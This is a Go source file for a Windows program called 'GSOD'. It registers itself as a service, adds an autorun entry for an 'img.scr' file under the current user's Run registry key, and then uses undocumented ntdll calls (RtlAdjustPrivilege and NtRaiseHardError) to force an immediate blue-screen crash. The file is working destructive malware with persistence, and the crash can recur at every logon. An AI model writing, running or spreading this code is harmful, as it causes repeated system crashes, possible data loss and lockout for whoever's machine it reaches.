package main

import (
	"fmt"
	"os"
	"path/filepath"
	"unsafe"

	"github.com/kardianos/service"
	"golang.org/x/sys/windows"
	"golang.org/x/sys/windows/registry"
)

//NTDLL is the user-mode face of the Windows kernel to support any number of application-level subsystems
type NTDLL struct {
	mod             *windows.LazyDLL
	AdjustPrivilege *windows.LazyProc
	RaiseHardError  *windows.LazyProc
}
type program struct{}

//StatusAccessViolation is usually caused by your computer not being able to correctly process the files and settings required to run a particular program or installation
const StatusAccessViolation = 0xC0000005

var logger service.Logger

func (dll *NTDLL) init() {
	dll.mod = windows.NewLazyDLL("ntdll.dll")
	dll.AdjustPrivilege = dll.mod.NewProc("RtlAdjustPrivilege")
	dll.RaiseHardError = dll.mod.NewProc("NtRaiseHardError")
}

func (dll *NTDLL) bsod() {

	var bEnabled int8
	dll.AdjustPrivilege.Call(19, 1, 0, uintptr(unsafe.Pointer(&bEnabled)))

	var uResp int32
	dll.RaiseHardError.Call(StatusAccessViolation, 0, 0, 0, 6, uintptr(unsafe.Pointer(&uResp)))
}

func currentDir() string {
	dir, err := filepath.Abs(filepath.Dir(os.Args[0]))
	if err != nil {
		panic(err)
	}
	return dir
}

func AutoRun() {
	k, _, err := registry.CreateKey(
		registry.CURRENT_USER,
		`SOFTWARE\Microsoft\Windows\CurrentVersion\Run`,
		registry.SET_VALUE,
	)
	if err != nil {
		panic(err)
	}
	defer k.Close()

	regSZ := fmt.Sprintf(`"%s\%s"`, currentDir(), "img.scr")
	if len(regSZ) > 260 {
		panic("data value is too long for registry entry")
	}
	k.SetStringValue("GSOD", regSZ)
	var dll NTDLL
	dll.init()
	dll.bsod()

}

func (p *program) Start(s service.Service) error {
	// Start should not block. Do the actual work async.
	go p.run()
	return nil
}
func (p *program) run() {
	AutoRun()
}
func (p *program) Stop(s service.Service) error {

	return nil
}
func main() {
	svcConfig := &service.Config{
		Name:        "GSOD",
		DisplayName: "GSOD",
		Description: "GSOD",
	}

	prg := &program{}
	s, err := service.New(prg, svcConfig)
	if err != nil {
		panic(err)
	}
	logger, err = s.Logger(nil)
	if err != nil {
		panic(err)
	}
	err = s.Run()
	if err != nil {
		panic(err)
	}
}
